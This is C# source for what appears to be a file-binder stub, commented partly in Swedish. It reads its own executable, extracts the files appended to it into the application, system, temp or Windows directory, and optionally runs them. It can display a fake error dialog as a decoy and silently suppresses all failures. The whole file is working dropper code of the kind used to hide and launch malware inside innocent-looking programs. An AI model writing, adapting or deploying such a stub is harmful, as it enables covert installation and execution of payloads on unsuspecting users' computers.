using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;
using System.IO;
using System.IO.Compression;
using System.Runtime.InteropServices;
using System.Reflection;

namespace Stub1
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            
            StreamReader sr = new StreamReader(Application.ExecutablePath); //Läs filen
            BinaryReader br = new BinaryReader(sr.BaseStream);
            byte[] binder = br.ReadBytes(Convert.ToInt32(sr.BaseStream.Length)); //Spara filen i minnet
            br.Close();
            sr.Close();
            ASCIIEncoding enc = new ASCIIEncoding();
            string file = enc.GetString(binder);  //Konvertera filen till en string
            string settings = file.Substring(file.LastIndexOf("|&&")); //Kolla vart inställningarna börjar
            char[] splitter = { '#' };
            char[] splitter2 = { '|' };
            string[] settingsSplit = settings.Split(splitter); 
            int count = 0; //Vilken fil?
            int stubSize = 0; //Hur stor är stuben?
            int currentPos = 0; //Här ifrån ska vi läsa nästa fil
            foreach (string propery in settingsSplit)
            {
                string[] settingsS = propery.Replace("|&&", null).Split(splitter2); //Dela upp inställningarna
                if (count == 0)
                {
                    //Settings for stub
                    // [0] = Size!
                    // [1] = Error msg?                    
                    stubSize = Convert.ToInt32(settingsS[0]);
                    currentPos = stubSize;
                    if (settingsS[1] != "False")
                    {
                        MessageBox.Show(settingsS[1], "Error!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
                else
                {
                    // Settings:
                    // [0] = Size!
                    // [1] = Where to extract?
                    // [2] = Execute?
                    // [3] = Name?
                    // [4] = Compressed?
                    // [5] = Compressed size!
                    int size = 0; // Size of file!
                    string extract = "C:\\"; // Where to extract!
                    string name = "none"; // Name of file!
                    bool execute = false; // Execute the file?
                    bool compressed = false; // Compressed?
                    int cSize = 0; //Size of compressed!
                    try
                    {
                        size = Convert.ToInt32(settingsS[0]);
                        extract = settingsS[1];
                        execute = Convert.ToBoolean(settingsS[2]);
                        name = settingsS[3];
                        compressed = Convert.ToBoolean(settingsS[4]);
                        cSize = Convert.ToInt32(settingsS[5]);

                        switch (extract) //Vart ska filen extractas?
                        {
                            case "Application": //Denna katalog
                                extract = Application.StartupPath + "\\" + name;
                                break;
                            case "System": //Systemkatalogen
                                extract = System.Environment.SystemDirectory + "\\" + name;
                                break;
                            case "Temporary": //Temporärkatalogen
                                extract = System.Environment.GetEnvironmentVariable("TEMP") + "\\" + name;
                                break;
                            case "Windows": //Windowskatalogen
                                extract = System.Environment.GetEnvironmentVariable("windir") + "\\" + name;
                                break;
                        }
                        StreamWriter sw = new StreamWriter(extract); //Skriv till filen
                        if (compressed == true)
                        {
                            byte[] bLoad = DeCompress(binder, currentPos, cSize, size);
                            sw.BaseStream.Write(bLoad, 0, size); //Skriv fil
                        }
                        else
                        {
                            sw.BaseStream.Write(binder, currentPos, size);
                        }
                        sw.Close(); //Klar! Stäng ström.
                        if (execute == true) // Ska filen exekveras?
                        {
                            System.Diagnostics.Process.Start(extract); //Exekvera
                        }
                        currentPos += size; //Spara positionen
                    }
                    catch
                    {
                    }
                }
                count++; //Öka count så att loopen fortsätter på nästa fil.
            }
        }



        private static byte[] DeCompress(byte[] binder, int currentPos, int length, int finalSize)
        {
            try
            {
                byte[] uncomp = new byte[finalSize];
                int totalLength = 0;
                byte[] writeData = new byte[4096];
                Stream s2 = new GZipStream(new MemoryStream(binder, currentPos, length), CompressionMode.Decompress);
                while (true)
                {
                    int size = s2.Read(uncomp, 0, finalSize);
                    if (size > 0)
                    {
                        totalLength += size;
                    }
                    else
                    {
                        break;
                    }
                }
                s2.Close();
                return uncomp;
            }
            catch
            {
                return null;
            }
        } 
    }
}